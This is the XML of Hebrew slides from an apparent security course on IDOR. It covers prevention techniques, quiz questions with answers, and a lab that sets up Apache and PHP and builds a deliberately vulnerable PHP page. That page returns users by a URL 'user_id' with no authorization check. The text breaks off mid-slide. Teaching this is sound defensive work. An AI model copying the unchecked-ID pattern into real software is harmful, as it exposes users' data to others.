              <a:t>. הפגיעות תוקנה במהרה, והמתכנת שגילה אותה זכה בפרס במסגרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>תוכנית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הבאג </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>באונטי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פייסבוק</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="852498214"/>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372238-83DB-4126-A693-C06A6362F271}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3955774" y="642594"/>
            <a:ext cx="7169426" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>טכניקות מניעתיות מתקדמות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53EB4511-9D9C-4B26-9082-49895D629582}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. גישה מבוססת תפקידים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Role-Based Access Control – RBAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>גישה מבוססת תפקידים מוודאת שלמשתמש יש תפקיד מתאים עם ההרשאות הנדרשות לגשת למשאבים מסוימים. חשוב להגדיר תפקידים בצורה נכונה ולהבטיח שההרשאות לא משויכות למזהים בלבד אלא גם לתפקיד המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. בדיקות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Penetration Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדיקות חדירה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Penetration Testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הן כלי חיוני לזיהוי פגיעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. על ידי ביצוע בדיקות ממוקדות, ניתן לחשוף פגיעות נסתרות ולתת מענה לפני שהן מנוצלות בפועל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. הגנה על נתיבים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Path Normalization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מנגנוני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Path Normalization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכולים להבטיח שהקלט של המשתמש נבדק ומנוקה לפני השימוש בו בכתובות קבצים או נתיבים, כך שכתובות לא תקינות לא יובילו לגישה לאובייקטים שאינם מאושרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="245994684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F34CB6-3C4A-418B-B7ED-AC5785947D17}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195930" y="642594"/>
            <a:ext cx="3929270" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAF3A7CF-A423-4538-A02A-4E1B4053A291}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד תוקף יכול לנצל פגיעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהם הצעדים למניעת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מהם האתגרים בבדיקות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>APIs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. כיצד מנגנון </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RBAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול למנוע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6. מדוע חשוב לשלב בדיקות חדירה כחלק מתהליך הפיתוח?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="62860227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C7A5B7-9166-47A7-8ADF-7B40A1AADF6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6997148" y="642594"/>
            <a:ext cx="4128052" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90C76AF3-E59C-4929-AA64-41A315CD0DD2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא פגיעות המאפשרת לתוקף לגשת ישירות לאובייקט על ידי שינוי מזהה האובייקט מבלי שהמערכת מוודאת את ההרשאות של</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. התוקף יכול לשנות את מזהה האובייקט ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או בפרמטרים אחרים כדי לגשת לאובייקט אחר שלמשתמש אין הרשאות לגשת אליו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. יש לוודא הרשאות, להשתמש במזהים מוצפנים, ולמנוע גישה ישירה לאובייקטים דרך מזהים חשופים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. האתגר המרכזי הוא שמזהים רבים יכולים להיות מוצפנים או סודיים. בנוסף, פעמים רבות ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>APIs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כוללים מבנה מורכב שמצריך בדיקות עמוקות של כל נקודות הקצה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. מנגנון </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RBAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול למנוע</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בכך שהוא מוודא שהמשתמש בעל תפקיד מתאים עם הרשאות לגשת לאובייקט מסוים, ולא רק על בסיס מזהה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6. בדיקות חדירה יכולות לזהות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלא התגלו בתהליכי בדיקה רגילים. הן מבצעות בדיקה מעמיקה של האפליקציה, כולל ניסיונות לנצל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="996806953"/>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7D3844F-E572-46B8-947A-27B2956CC1A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5307496" y="642594"/>
            <a:ext cx="5817704" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תרגול להמחשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1900B00A-0350-4AD8-9D87-66D4AC4AB1F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מטרה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>להבין כיצד התקפה מבוססת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IDOR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יכולה לחשוף מידע רגיש על ידי שינוי פרמטרים ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>צעד 1: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יצירת אתר דמה התקנת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Apache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ו-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> apt update</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> apt install apache2 php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אח"כ אנו ניצור תיקייה לאתר דמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mkdir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> /var/www/html/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>simple_idor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>chown</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>www-data:www-data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> /var/www/html/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>simple_idor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אח"כ אנו ניצור דף </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ונשים בתיקייה החדשה לדוגמה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="it-IT" dirty="0"/>
              <a:t>sudo nano /var/www/html/simple_idor/index.php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1774743039"/>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3EE1A02-07AA-463B-9656-901DD0CEA35D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3627783" y="0"/>
            <a:ext cx="7805530" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - תרגול להמחשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9C283136-BD32-44DF-A3C4-D00D8A1CE23A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1232451"/>
            <a:ext cx="10058400" cy="6003236"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="32500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="6200" dirty="0"/>
              <a:t>מיד לאחר מכן נקבל מקום שבוא נוכל לכתוב את הקוד הזה, שמציין לנו בעצם את האתר שלנו:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>&lt;?php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>// Fake database of users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>$users = [</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>    1 =&gt; 'Alice',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>    2 =&gt; 'Bob',</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>    3 =&gt; 'Charlie'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>// Get user ID from URL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0" err="1"/>
              <a:t>isset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>($_GET['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>']) ? (int)$_GET['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>'] : 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>// Check if user ID is valid</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0" err="1"/>
              <a:t>array_key_exists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>, $users)) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>    echo "Hello, " . </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>($users[$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>]) . "!";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>} else {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>    echo "User not found.";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3115416594"/>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8616607-AEF7-47F0-A7A2-3BAA60BBE0E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3289852" y="642594"/>
            <a:ext cx="7835348" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
